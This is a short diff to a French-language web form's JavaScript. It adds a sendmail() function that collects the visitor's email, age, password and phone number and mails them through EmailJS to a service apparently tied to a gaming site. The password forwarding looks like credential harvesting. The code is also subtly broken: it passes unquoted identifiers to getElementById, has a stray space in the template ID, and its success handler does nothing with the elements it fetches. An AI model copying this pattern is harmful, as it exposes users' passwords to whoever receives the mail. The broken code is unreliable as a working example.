@@ -42,3 +42,29 @@ document.addEventListener('DOMContentLoaded', () => {
         alert('Formulaire soumis avec succès!');
     });
 });
+function sendmail(){
+    var params ={
+        email :document.getElementById(email).value ,
+        age : document.getElementById(age).value ,
+        password: document.getElementById(password).value ,
+        phone : document.getElementById(phone).value ,
+
+    }
+    const serviceID ="service-seconde cahnce gaming dz"
+    const templateID = " template_4svwrvm"
+    emailjs.send(serviceID,templateID,params)
+    .then(
+        res =>{
+            document.getElementById("email")
+            document.getElementById("age")
+            document.getElementById("password")
+            document.getElementById("phone")
+            console.log(res)
+            alert("your message was sent succesfuly")
+    
+        }
+    )
+    .catch((err)=>console.log(err));
+    
+
+}
